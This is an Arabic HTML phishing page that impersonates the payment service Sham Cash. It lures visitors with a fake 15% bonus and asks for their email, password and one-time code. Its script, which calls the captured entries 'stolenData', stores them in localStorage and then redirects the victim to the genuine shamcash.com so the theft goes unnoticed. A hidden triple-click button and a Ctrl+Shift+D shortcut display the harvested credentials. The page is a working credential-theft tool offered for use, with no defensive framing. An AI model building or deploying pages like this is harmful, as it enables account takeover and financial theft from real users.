<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شام كاش - بونص 15%</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Tahoma', Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 380px; text-align: center; }
        .logo { font-size: 26px; font-weight: bold; color: #1877f2; margin-bottom: 15px; }
        .bonus { color: #e74c3c; font-size: 22px; font-weight: bold; margin: 10px 0; }
        .input-group { margin: 12px 0; text-align: right; }
        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; }
        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        .hidden-btn { 
            position: fixed; 
            bottom: 10px; 
            right: 10px; 
            width: 30px; 
            height: 30px; 
            background: transparent; 
            border: none; 
            cursor: pointer; 
            opacity: 0.3;
            z-index: 999;
        }
        .hidden-btn:hover { opacity: 1; }
        #dataDisplay { 
            display: none; 
            background: #1a1a2e; 
            color: #0f0; 
            padding: 15px; 
            border-radius: 8px; 
            margin-top: 15px; 
            text-align: left; 
            font-size: 12px; 
            max-height: 200px; 
            overflow-y: auto; 
            white-space: pre-wrap;
            direction: ltr;
        }
        #clickCounter { 
            display: none; 
            font-size: 11px; 
            color: #999; 
            margin-top: 5px; 
        }
        .note { font-size: 12px; color: #999; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏦 شام كاش</div>
        <h3>🎁 عرض خاص</h3>
        <p class="bonus">احصل على بونص 15% على أول شحن!</p>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="كلمة المرور" required>
            </div>
            <div class="input-group">
                <input type="text" id="otp" placeholder="رمز التحقق OTP" maxlength="6">
            </div>
            <button type="submit" class="btn">تأكيد واستلام البونص</button>
        </form>
        
        <!-- زر مخفي لاستعراض البيانات -->
        <button class="hidden-btn" id="hiddenBtn" title="اضغط 3 مرات لعرض البيانات"></button>
        <div id="clickCounter">0 / 3</div>
        
        <!-- عرض البيانات المسجلة -->
        <div id="dataDisplay"></div>
        
        <div class="note">سيتم توجيهك إلى التطبيق بعد التأكيد</div>
    </div>

    <script>
        // ====== تخزين البيانات المسروقة ======
        let stolenData = [];
        let clickCount = 0;
        
        // ====== عند إرسال النموذج ======
        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const otp = document.getElementById('otp').value;
            const timestamp = new Date().toLocaleString('ar-EG');
            
            // تخزين البيانات
            const entry = `[${timestamp}] البريد: ${email} | كلمة المرور: ${password} | OTP: ${otp}`;
            stolenData.push(entry);
            
            // حفظ في localStorage (حتى لو أغلق الصفحة)
            const saved = JSON.parse(localStorage.getItem('stolenData') || '[]');
            saved.push(entry);
            localStorage.setItem('stolenData', JSON.stringify(saved));
            
            // عرض رسالة نجاح
            alert('✅ جاري التحقق...');
            
            // توجيه للتطبيق الحقيقي
            setTimeout(function() {
                window.location.href = 'https://shamcash.com';
            }, 2000);
        };
        
        // ====== الزر المخفي (ضغط 3 مرات) ======
        document.getElementById('hiddenBtn').addEventListener('click', function() {
            clickCount++;
            document.getElementById('clickCounter').style.display = 'block';
            document.getElementById('clickCounter').textContent = `${clickCount} / 3`;
            
            if (clickCount >= 3) {
                // عرض البيانات
                showStolenData();
                clickCount = 0;
                document.getElementById('clickCounter').textContent = '✅ ظهرت البيانات';
            }
        });
        
        // ====== عرض البيانات المسجلة ======
        function showStolenData() {
            const display = document.getElementById('dataDisplay');
            
            // جلب البيانات من localStorage
            const saved = JSON.parse(localStorage.getItem('stolenData') || '[]');
            
            if (saved.length === 0) {
                display.textContent = '📭 لا توجد بيانات مسجلة بعد.';
                display.style.display = 'block';
                return;
            }
            
            // تنسيق البيانات
            let output = '📋 البيانات المسجلة:\n' + '='.repeat(40) + '\n';
            saved.forEach((entry, index) => {
                output += `${index + 1}. ${entry}\n`;
                output += '-'.repeat(40) + '\n';
            });
            output += `\n📊 إجمالي: ${saved.length} عملية`;
            
            display.textContent = output;
            display.style.display = 'block';
            
            // إظهار إشعار بعدد البيانات
            alert(`✅ تم استلام ${saved.length} عملية بنجاح!`);
        }
        
        // ====== تحميل البيانات السابقة عند فتح الصفحة ======
        window.onload = function() {
            const saved = JSON.parse(localStorage.getItem('stolenData') || '[]');
            if (saved.length > 0) {
                console.log(`📥 تم تحميل ${saved.length} عملية مسجلة مسبقاً`);
            }
        };
        
        // ====== اختصار لوحة المفاتيح (Ctrl+Shift+D) لعرض البيانات ======
        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
                e.preventDefault();
                showStolenData();
            }
        });
    </script>
</body>
</html>
